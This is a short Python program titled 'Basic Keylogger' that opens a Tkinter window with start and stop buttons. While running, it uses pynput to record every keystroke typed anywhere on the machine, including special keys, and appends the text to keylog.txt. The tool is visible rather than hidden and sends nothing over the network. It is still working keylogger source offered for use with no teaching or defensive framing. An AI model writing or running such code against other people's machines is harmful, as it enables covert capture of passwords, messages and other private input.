import tkinter as tk
from tkinter import messagebox
from pynput import keyboard
import threading

class Keylogger:
    def __init__(self):
        self.log = ""
        self.listener = keyboard.Listener(on_press=self.on_press)
        self.listener.start()
    
    def on_press(self, key):
        try:
            self.log += key.char
        except AttributeError:
            if key == keyboard.Key.space:
                self.log += " "
            elif key == keyboard.Key.enter:
                self.log += "\n"
            else:
                self.log += f" [{str(key)}] "
    
    def save_log(self):
        with open("keylog.txt", "a") as f:
            f.write(self.log)
        self.log = ""

def start_logging():
    global keylogger
    keylogger = Keylogger()
    messagebox.showinfo("Keylogger", "Keylogger has started.")

def stop_logging():
    global keylogger
    if keylogger.listener.running:
        keylogger.listener.stop()
        keylogger.save_log()
        messagebox.showinfo("Keylogger", "Keylogger has stopped and logs are saved to keylog.txt.")
    else:
        messagebox.showinfo("Keylogger", "Keylogger is not running.")

# Create the main window
root = tk.Tk()
root.title("Basic Keylogger")

# Create and place the widgets
frame = tk.Frame(root, padx=10, pady=10)
frame.pack(padx=10, pady=10)

start_button = tk.Button(frame, text="Start Keylogger", command=start_logging)
start_button.grid(row=0, column=0, pady=5)

stop_button = tk.Button(frame, text="Stop Keylogger", command=stop_logging)
stop_button.grid(row=0, column=1, pady=5)

# Start the main event loop
root.mainloop()
